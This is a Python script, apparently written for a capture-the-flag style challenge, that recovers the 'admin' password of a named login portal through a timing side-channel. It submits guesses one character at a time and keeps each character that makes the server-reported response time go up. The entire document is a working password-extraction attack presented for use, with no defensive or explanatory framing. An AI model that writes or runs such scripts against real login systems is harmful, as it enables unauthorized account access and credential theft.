import requests
import string

# URL of the target system's login page
url = 'https://portal.regjeringen.uiaikt.no/login'

# Username for which to guess the password
username = 'admin'

# Function to send a password guess and retrieve the response time
def send_password_guess(guess):
    data = {
        "username": username,
        "password": guess
    }
    response = requests.post(url, json=data)
    response_data = response.json()
    response_time = response_data.get("total_time") - 1
    return response_time
    

# The initial part of the password (start with a known incorrect character)
password_guess = '0' * 17
printable = string.printable

# Loop through the password length
for i in range(17):  # For each character position
    for char in printable:
        # Replace the character at position i
        current_guess = password_guess[:i] + char + password_guess[i+1:]
        
        # Measure response time
        response_time = send_password_guess(current_guess)
        
        print(f"Tried {current_guess} and got response time {response_time}")
        # Check if the response time increased
        if response_time > i:
            password_guess = current_guess
            print(f"Found character at position {i + 1}: {char}")
            break

# Final password found
print(f"Password found: {password_guess}")
